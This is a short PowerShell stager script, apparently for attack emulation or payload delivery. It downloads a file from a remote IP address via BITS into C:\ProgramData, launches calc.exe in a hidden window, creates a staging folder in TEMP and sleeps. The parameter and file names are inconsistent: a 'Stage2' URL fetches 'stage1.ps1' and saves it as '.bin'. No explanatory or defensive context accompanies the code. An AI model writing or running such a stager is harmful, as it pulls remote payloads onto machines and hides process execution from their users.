
[CmdletBinding()]
param(
    [string]$Stage2Url = "https://192.0.2.182:443/stage1.ps1",
    [string]$WorkingPath = "C:\ProgramData\stage1.bin",
    [int]$TimeoutSec = 95
)
try { Start-BitsTransfer -Source $Stage2Url -Destination $WorkingPath; Start-Process -FilePath "calc.exe" -WindowStyle Hidden; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; Start-Sleep -Seconds 29 } catch { Write-Warning "Remote fetch failed" }
